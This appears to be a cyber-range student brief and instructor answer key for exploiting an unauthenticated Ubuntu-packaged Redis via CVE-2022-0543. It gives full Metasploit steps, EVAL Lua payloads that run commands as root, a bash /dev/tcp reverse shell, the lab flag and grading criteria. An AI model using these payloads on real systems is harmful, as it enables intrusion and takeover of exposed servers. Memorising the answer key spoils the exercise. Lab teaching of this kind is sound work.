# Charlotte Student Brief

## General Instructions

On this subnet, `.254` is the lab router and is out of bounds.

The following docker containers are available to you as pre-installed tools helpful for the labs. Additional details are in the README.txt file on the Kali desktop.

- JavaChains

## Assigned Subnet

`192.168.17.0/24`

## Objective

From your assigned operations station, discover the host on the assigned subnet, gain appropriate access, and collect the flag.

The flag is obvious once you reach it. It is not intentionally hidden or obfuscated.

## Deliverable

Record the flag value for Charlotte.

## PCTE range limitations

These limits apply on Persistent Cyber Training Environment (PCTE) ranges used by this Module. Treat the items below as a no-strike list when they exist. Not every item is present on every range or host.

Do not target, block, terminate, or delete range-control artifacts:

- **Network:** `10.0.0.0/8` (range control and instrumentation; do not block or flag that traffic). Routers past the edge-router in grey space. TCP `5672` (AMQP user-emulation on the control subnet), `49998`, and `49999`.
- **Accounts:** `range-admin` / `range_admin`, `range-control`, and `range`. Do not use accounts whose username or password contains `simspace`.
- **User emulation:** do not stop it. Typical paths: `C:\Program Files (x86)\Simspace\` and `C:\Users\<Username>\Simspace`. Scripts: `run-actuation.cmd`, `ueactuation.cmd`.
- **Directories:** `C:\Program Files\Puppet Labs` and the Simspace paths above.
- **Processes:** `java.exe`, `javaw.exe`, `ruby.exe`, `rubyw.exe`, `start.exe`, `chromedriver.exe`, `IEDriverServer.exe`, Metova, Selenium, WebDriver.

# Charlotte — Instructor Answer Key

## Objective and starting context

Students start on the assigned operations station with only the city codename and subnet `192.168.17.0/24`. They must discover the live host, gain access, and recover the flag. The live instructor walkthrough is in this file.

Do not give students the service name, CVE, or host IP.

## Flag / reference table

|Item|Value|
|---|---|
|City|Charlotte|
|Assigned subnet|`192.168.17.0/24`|
|Deploy flag key|`T8_FLAG`|
|Default flag|`azure-jackal`|
|Flag location on target|`/flag.txt` after access|

Rotate `T8_FLAG` in `environments/pcte_vulnhub_targets/.env` and restart the matching container when the class needs a new value. Grade against the live `.env` value, not only the default in this table.

## Initial situational awareness

Establish ops-station context before touching the assigned subnet. These commands are first-use literacy for this Module: run the full set, then interpret.

```
date -u
hostname
whoami
id
pwd
echo "$SHELL"
uname -a
cat /etc/os-release
who
w
ps aux
ss -tulpen
ss -tunap
ip a
ip -4 route
```

Why this matters:

- `date -u` and `hostname` fix remote time and host identity before any later log or packet evidence.
- `whoami`, `id`, `pwd`, and `echo "$SHELL"` lock user, session, and interpreter context.
- `uname -a` and `/etc/os-release` capture OS/runtime version.
- `who` / `w` and `ps aux` show active users and a process baseline.
- `ss -tulpen` (listeners) and `ss -tunap` (active sockets) give the required TCP+UDP picture.
- `ip -4 route` and `ip route get 192.168.17.10` show that the assigned subnet is already reachable via the default gateway.

Expected findings:

- The student is on the operations station (hostname `ops`), not on the city target. The shell is `zsh`.
- `ip -4 addr` shows the lab-facing address on `eth1` (this deployment: `172.16.123.100/24`). The `eth0` address `10.10.123.100/16` is not the path to this city subnet.
- `ip route get 192.168.17.10` uses the default gateway (this deployment: `via 172.16.123.253 dev eth1 src 172.16.123.100`). Do not add a route via `192.168.100.254`. That next hop does not answer, and a more-specific route would hide the working default path.
- Listening sockets on the ops station are local tooling, not the target. `ss` shows SSH and the local JavaChains listener on `8011/tcp`.

## Instructor live walkthrough

### Objective and starting context

Live instructor demo for the Charlotte Module (`B02.M08`). Students know only the assigned subnet `192.168.17.0/24`. On this range, `.254` is the lab router on the segment and is out of bounds. Do not open with the product name, CVE, or host IP.

This walkthrough is rewritten onto the `192.168.17.0/24` student-facing range. Example host addresses in later steps use the `.10` (and, where present, `.11`) convention from the shared stack; treat those as discovered values, not pre-briefed facts.

The deploy flag key is `T8_FLAG`. Confirm the live `.env` value before grading.

### Required Tools

- `iproute2` (for `ip route get`. This ops station already has a path, so do not add a static route)
- `nmap` (for host discovery and port scanning)
- `redis-cli` (Redis command-line client — `PING`, `INFO`, `EVAL`)
- `nc` (Netcat, for catching the reverse shell in section 5B)
- `metasploit-framework` (section 4 automated path via `exploit/linux/redis/redis_debian_sandbox_escape`)

### 1. Network Routing & Host Discovery

At the start of this scenario, we only know the target subnet: `192.168.17.0/24`. The operations station is on `172.16.123.0/24` (`eth1`). The city subnet is reached through the default gateway.

Confirm the path before scanning. `ip route get` prints the next hop and the source address the kernel will use:

```
ip route get 192.168.17.10
```

_Output:_

```
192.168.17.10 via 172.16.123.253 dev eth1 src 172.16.123.100 uid 1000
    cache
```

**Observation:** The subnet is already reachable. The source address is `172.16.123.100`.

**Inference:** Do not run `ip route add 192.168.17.0/24 via 192.168.100.254`. `192.168.100.254` does not answer on this range, and that more-specific route would override the working default path.

With connectivity available, find which addresses on the subnet actually answer. `nmap -sn` is a ping sweep: it checks host up/down and **does not** port-scan. That is cheaper than a full TCP scan of every IP, and we only have a subnet so far — we still need a live host before we care about services.

```
nmap -sn -n 192.168.17.0/24
```

_Why `-n`:_ skip reverse DNS. The ops station resolver (`172.16.123.253`) refuses DNS. Without `-n`, this sweep sits at full CPU and does not print hosts. With `-n`, the same sweep finishes in a few seconds.

_Output excerpt:_

```
Nmap scan report for 192.168.17.10
Host is up.
Nmap scan report for 192.168.17.254
Host is up.
```

**Observation:** Two hosts respond on this subnet. `192.168.17.1` does not.

**Inference:** The student brief marks `.254` as the lab router and out of bounds. Concentrate service enumeration on **192.168.17.10**. The shell later confirms that address is the workload's default gateway.

### 2. Service Enumeration

We have a candidate IP. Next question: **what is listening, and what does it claim to be?** That takes a version scan, not another ping sweep.

```
nmap -Pn -sV -n -p- 192.168.17.10
```

_Why these options:_

- `-Pn` — skip nmap’s host-discovery probes. We already know `192.168.17.10` responded to `-sn`. This also keeps the scan going if the host later ignores ping but still serves TCP.
- `-n` — skip reverse DNS, same reason as the sweep. The resolver still refuses.
- `-sV` — version detection. An open port labeled only `redis` is weaker than a version string (here, **Redis 5.0.7**).
- `-p-` — all 65535 TCP ports, not nmap’s default top 1000. A single missed listener would hide the whole attack surface. On this host the extra cost is small.

_Output excerpt:_

```
PORT     STATE SERVICE VERSION
6379/tcp open  redis   Redis key-value store 5.0.7
```

**Observation:** A single open port — **6379/tcp** — fingerprinted as **Redis 5.0.7**.

**Inference:** Port 6379 is Redis’s default listen port ([redis.conf `port 6379`](https://redis.io/docs/management/config/)). This is not HTTP. Talk to it with the Redis client, not `curl`. Read that client’s usage **before** sending commands.

#### `redis-cli` usage (read this first)

Kali ships `redis-cli`. Its help page is how we know `-h` is the **server hostname** (easy to confuse with curl’s `-h` / `--help`). Extra arguments after the options are Redis commands.

```
redis-cli --help
```

_Excerpt (the lines we use):_

```
Usage: redis-cli [OPTIONS] [cmd [arg [arg ...]]]
  -h <hostname>      Server hostname (default: 127.0.0.1).
  -p <port>          Server port (default: 6379).
  -a <password>      Password to use when connecting to the server.
```

**What that means here:** `-h 192.168.17.10` is the target we just found. Port defaults to **6379**, which matches nmap, so we can omit `-p`. There is no `-a` until something asks for `AUTH`. Commands such as `PING` and `INFO` are documented in the Redis command reference ([PING](https://redis.io/commands/ping/), [INFO](https://redis.io/commands/info/)) — they are not lab-specific flags.

#### Initial Redis probing

`PING` is the documented health check: if the server answers `PONG` with no `-NOAUTH`, we have an unauthenticated client.

```
redis-cli -h 192.168.17.10 ping
```

_Output:_

```
PONG
```

**Observation:** `PING` returns `PONG` with no `AUTH` challenge.

**Inference:** The instance accepts unauthenticated clients. `INFO server` (same command reference, [INFO](https://redis.io/commands/info/)) dumps version, OS, build id, and config path so we can tell a packaged Debian/Ubuntu Redis from a generic upstream binary.

```
redis-cli -h 192.168.17.10 INFO server
```

_Output:_

```
# Server
redis_version:5.0.7
redis_git_sha1:00000000
redis_git_dirty:0
redis_build_id:636cde3b5c7a3923
redis_mode:standalone
os:Linux 6.17.10+kali-amd64 x86_64
arch_bits:64
multiplexing_api:epoll
atomicvar_api:atomic-builtin
gcc_version:9.2.1
process_id:1
run_id:501ff8ad90fe8238d579320022ce6c8f79e2cfd8
tcp_port:6379
uptime_in_seconds:5668
uptime_in_days:0
hz:10
configured_hz:10
lru_clock:5145954
executable:/redis-server
config_file:/etc/redis/redis.conf
```

`run_id`, `uptime_in_seconds`, and `lru_clock` change across restarts. The `os` line is the range host kernel seen from inside the container, not the Ubuntu package version. The stable fingerprints are `redis_version`, `redis_build_id`, `tcp_port`, `executable`, and `config_file`.

From that response:

- **Redis 5.0.7** (`redis_version`)
- **`redis_build_id:636cde3b5c7a3923`** — stock Ubuntu **20.04** `redis-server` 5.0.7 package fingerprint (same id appears in Ubuntu 20.04 Redis examples, e.g. [redis#8443](https://github.com/redis/redis/issues/8443))
- Listening on **6379** (`tcp_port`)
- **Linux x86_64** (`os`, `arch_bits`)
- Config path **`/etc/redis/redis.conf`** (packaged layout, not a random upstream binary)

**Observation:** Unauthenticated **and** Ubuntu 20.04 packaged Redis 5.0.7 (`build_id` + `/etc/redis/redis.conf`).

**Inference:** Unauthenticated Redis has several historically abused surfaces (CONFIG/file write, rogue replication, `MODULE LOAD`, Lua `EVAL`). With an **Ubuntu-packaged** build, search the packaging fingerprint first: `redis 636cde3b5c7a3923 cve` or `Redis 5.0.7 Ubuntu 20.04 Lua sandbox`. Those queries surface **CVE-2022-0543**, a Debian/Ubuntu Lua sandbox escape — not a bug in upstream Redis itself.

### 3. Vulnerability Discovery

We now know:

- Unauthenticated **Redis 5.0.7** on **6379**
- **`redis_build_id:636cde3b5c7a3923`** → Ubuntu 20.04 packaged `redis-server`
- Public search from that build id points at **CVE-2022-0543**

**What the bug is:** Debian/Ubuntu dynamically link Lua and leave the Lua global **`package`** table populated inside `EVAL`. A tight upstream sandbox hides `package`. With it present, attacker Lua can call `package.loadlib()` and reach `io.popen()` ([Reginaldo Silva](https://ubercomp.com/posts/2022-01-20_redis_on_debian_rce); [Debian #1005787](https://bugs.debian.org/cgi-bin/bugreport.cgi?bug=1005787); [NVD CVE-2022-0543](https://nvd.nist.gov/vuln/detail/CVE-2022-0543)). Vulhub’s notes and PoC Lua live in `vulnhub/redis/CVE-2022-0543/README.md`.

**Candidate selection:** Prove this sandbox leak (`os` blocked, `package` present) before Metasploit or a reverse shell. Older Redis replication/`MODULE LOAD` tricks are a different class of bug.

#### `EVAL` — where the redis-cli syntax comes from

`EVAL` is a stock Redis command: [EVAL](https://redis.io/commands/eval/). The documented form is:

```
EVAL script numkeys [key [key ...]] [arg [arg ...]]
```

`numkeys` is how many of the following arguments are `KEYS`. We are not passing Redis keys, only a Lua snippet, so **`numkeys` is `0`**. That trailing `0` is required by the command spec — it is not a lab token.

`redis-cli --help` already showed `[cmd [arg ...]]`, so:

```
redis-cli -h <host> EVAL '<lua>' 0
```

is `EVAL` + script + `numkeys=0`, the same as typing `EVAL` in `redis-cli` interactive mode.

Harmless check that Lua runs (Silva/Vulhub start from `EVAL` as well):

```
redis-cli -h 192.168.17.10 EVAL 'return 1+1' 0
```

_`EVAL` vs `eval`:_ Redis commands are case-insensitive. The walkthrough uses `EVAL` to match the docs; lowercase `eval` works the same.

_Output:_

```
2
```

**Observation:** Lua evaluation works.

A tight sandbox should hide both `os` and `package`. Silva’s write-up uses exactly this contrast: `os` is gone, **`package` is not**.

```
redis-cli -h 192.168.17.10 EVAL 'return type(os)' 0
```

_Output excerpt:_

```
ERR Error running script ... Script attempted to access nonexistent global variable 'os'
```

```
redis-cli -h 192.168.17.10 EVAL 'return type(package)' 0
```

_Output:_

```
table
```

**Observation:** `os` is blocked; `type(package)` returns `table`.

**Inference:** This is the CVE-2022-0543 packaging failure, not “Redis with no AUTH” in general. Command execution is `package.loadlib` + `io.popen` from the same public PoC (section 5A). Metasploit (section 4) wraps that Lua for you.

### 4. Automated Path: Metasploit

Product + confirmed leaky Lua `package` table is enough to search Metasploit:

```
msf6 > search redis_debian_sandbox_escape

Matching Modules
================

   #  Name                                             Disclosure Date  Rank       Check  Description
   -  ----                                             ---------------  ----       -----  -----------
   0  exploit/linux/redis/redis_debian_sandbox_escape  2022-02-18       excellent  Yes    Redis Lua Sandbox Escape
```

(The same module is findable with `search cve:2022-0543`.) Default payload is already `cmd/unix/reverse_bash`. This instance has no `AUTH` — `unset PASSWORD`. `LUA_LIB` defaults to the Debian/Ubuntu amd64 library used in Silva/Vulhub (`/usr/lib/x86_64-linux-gnu/liblua5.1.so.0`).

```
msfconsole -q
```

```
msf6 > use exploit/linux/redis/redis_debian_sandbox_escape
msf6 exploit(linux/redis/redis_debian_sandbox_escape) > set RHOSTS 192.168.17.10
msf6 exploit(linux/redis/redis_debian_sandbox_escape) > set RPORT 6379
msf6 exploit(linux/redis/redis_debian_sandbox_escape) > unset PASSWORD
msf6 exploit(linux/redis/redis_debian_sandbox_escape) > set LUA_LIB /usr/lib/x86_64-linux-gnu/liblua5.1.so.0
msf6 exploit(linux/redis/redis_debian_sandbox_escape) > set LHOST 172.16.123.100
msf6 exploit(linux/redis/redis_debian_sandbox_escape) > set LPORT 4444
msf6 exploit(linux/redis/redis_debian_sandbox_escape) > set TARGET 0
msf6 exploit(linux/redis/redis_debian_sandbox_escape) > set PAYLOAD cmd/unix/reverse_bash
msf6 exploit(linux/redis/redis_debian_sandbox_escape) > run
```

`LHOST` is the `src` address from `ip route get 192.168.17.10`. Do not use `192.168.100.1`. That address is not on this station.

`unset PASSWORD` prints a warning that a default value remains and suggests `set --clear PASSWORD`. The session still opens, because this Redis instance has no AUTH.

_Output excerpt:_

```
[*] Started reverse TCP handler on 172.16.123.100:4444
[+] 192.168.17.10:6379 - The target is vulnerable. Successfully executed the 'id' command.
[*] Command shell session 1 opened (172.16.123.100:4444 -> 192.168.17.10:51266)
```

The source port changes across runs.

In the session:

```
id
date -u
hostname
whoami
ip a
ip r
pwd
echo "$SHELL"
ps aux
uname -a
cat /etc/os-release
who
w
ss -tulpen
ss -tunap
```

Expected findings on this image:

- `id` is `uid=0(root)`. `whoami` is `root`. `hostname` is the container id (this run: `e074344a3623`). It changes when the container is recreated.
- `ip r` shows `default via 192.168.17.254`. `pwd` is `/var/lib/redis`.
- `echo "$SHELL"` prints an empty value. `/etc/os-release` is Ubuntu 20.04.4 LTS. `uname -a` reports the range host kernel.
- `ps`, `w`, and `who` are installed. `ss` and `netstat` are not, so those two `ss` lines fail.

Quote the pattern so the ops station's `zsh` does not expand it before the command reaches the target:

```
find / -iname '*flag*' 2>/dev/null
cat /flag.txt
```

The broad name match also hits kernel paths that contain `flags`. The proof file is `/flag.txt`.

_Output of `cat /flag.txt`:_

```
azure-jackal
```

That is a complete automated path to the flag. Section 5 is the same Lua without Metasploit.

### 5. Manual Path: `EVAL` + `package.loadlib`

The Lua is **not** a second unpublished exploit. It is the PoC from Silva’s post and the Vulhub README (`vulnhub/redis/CVE-2022-0543/README.md`): load Debian’s `liblua5.1.so.0`, open the `io` library, `popen` a shell command. Metasploit’s `LUA_LIB` is that same path. Debian/Ubuntu amd64 puts the library at `/usr/lib/x86_64-linux-gnu/liblua5.1.so.0` (multiarch). A guess like `/usr/lib/liblua.so` returns nil and the script dies.

`EVAL` / `numkeys=0` is still the Redis command spec from section 3.

#### 5A. Non-shell (command output over `EVAL`)

Load the library and confirm `luaopen_io` is a function (first lines of the public PoC):

```
redis-cli -h 192.168.17.10 EVAL \
  'local io_l = package.loadlib("/usr/lib/x86_64-linux-gnu/liblua5.1.so.0", "luaopen_io"); return type(io_l)' \
  0
```

_Output:_

```
function
```

**Observation:** `loadlib` returned a callable opener.

**Inference:** Native Lua I/O is reachable. The rest of the PoC is `io_l()`, then `io.popen("id", "r")`, read stdout, return it to `EVAL`.

```
local io_l = package.loadlib("/usr/lib/x86_64-linux-gnu/liblua5.1.so.0", "luaopen_io");
local io = io_l();
local f = io.popen("id", "r");
local res = f:read("*a");
f:close();
return res
```

```
redis-cli -h 192.168.17.10 EVAL \
  'local io_l = package.loadlib("/usr/lib/x86_64-linux-gnu/liblua5.1.so.0", "luaopen_io"); local io = io_l(); local f = io.popen("id", "r"); local res = f:read("*a"); f:close(); return res' \
  0
```

_Output:_

```
uid=0(root) gid=0(root) groups=0(root)
```

**Observation:** `id` ran as **root** inside the Redis process. Output came back on the `EVAL` reply — no listener required.

Same primitive for the flag (`popen` argument is just another command):

```
redis-cli -h 192.168.17.10 EVAL \
  'local io_l = package.loadlib("/usr/lib/x86_64-linux-gnu/liblua5.1.so.0", "luaopen_io"); local io = io_l(); local f = io.popen("cat /flag.txt", "r"); local res = f:read("*a"); f:close(); return res' \
  0
```

_Output:_

```
azure-jackal
```

Use 5A when you only need command output (or outbound callbacks are blocked). Use 5B when you want an interactive shell.

#### 5B. Reverse shell

Same `loadlib` / `popen` PoC; `popen` runs bash to your listener instead of `id`. Redis still runs as **root** in this container.

Start a Netcat listener on the operations station. `LHOST` below is the `src` address from `ip route get 192.168.17.10`:

```
nc -lvnp 4444
```

`nc -l` listen, `-v` verbose, `-n` numeric addresses, `-p 4444` port.

The public PoC does not background the process. If `popen` waits for bash to exit, `redis-cli` hangs even after Netcat connects. Append `&` inside the shell command so `EVAL` returns.

```
LHOST="172.16.123.100"   # src from: ip route get 192.168.17.10
LPORT="4444"

redis-cli -h 192.168.17.10 EVAL \
  "local io_l = package.loadlib('/usr/lib/x86_64-linux-gnu/liblua5.1.so.0', 'luaopen_io'); local io = io_l(); io.popen('bash -c \"bash -i >& /dev/tcp/$LHOST/$LPORT 0>&1 &\"'); return 'sent'" \
  0
```

Outer double quotes so `$LHOST` / `$LPORT` expand on **your** Kali. Inner `\"` protects the bash `-c` string. That quoting is local shell mechanics, not Redis.

_Listener excerpt:_

```
listening on [any] 4444 ...
connect to [172.16.123.100] from (UNKNOWN) [192.168.17.10] 51266
bash: cannot set terminal process group (1): Inappropriate ioctl for device
bash: no job control in this shell
root@e074344a3623:/var/lib/redis#
```

The source port and the container id in the prompt change across runs. The peer address is the city host. The working directory `/var/lib/redis` is stable on this image.

```
cat /flag.txt
```

_Output:_

```
azure-jackal
```

Target 8 is complete.

## Troubleshooting / confirmation

- If the subnet does not respond, confirm the stack is up and `ip route get 192.168.17.10` still uses the default gateway. Do not add a route via `192.168.100.254`.
- If `nmap -sn` never prints hosts, rerun it with `-n`.
- If the session does not connect, set `LHOST` to the `src` address from `ip route get 192.168.17.10`, not `192.168.100.1`.
- If the recovered string does not match this table, read the live `T8_FLAG` from `.env` before marking the quiz wrong.
- If students name a CVE or product before they have service evidence, redirect them to host discovery and version output.
- The city subnet for this module is `192.168.17.0/24`. The ops-station address can change with DHCP; take `LHOST` from `ip route get`, not from a remembered `172.16.123.100`.

## Grading checkpoints

|Checkpoint|Acceptable evidence|
|---|---|
|Assigned subnet used|Student worked `192.168.17.0/24` (or the live remapped equivalent)|
|Host discovered|Live host identified from a subnet sweep, not from a handed IP|
|Access gained|Command or session evidence that reached the target filesystem|
|Flag submitted|Quiz value matches live `T8_FLAG` (default `azure-jackal`)|

Accept a correct live flag even if the student used a valid alternate exploit path. Do not award the quiz for a walkthrough dump without the flag.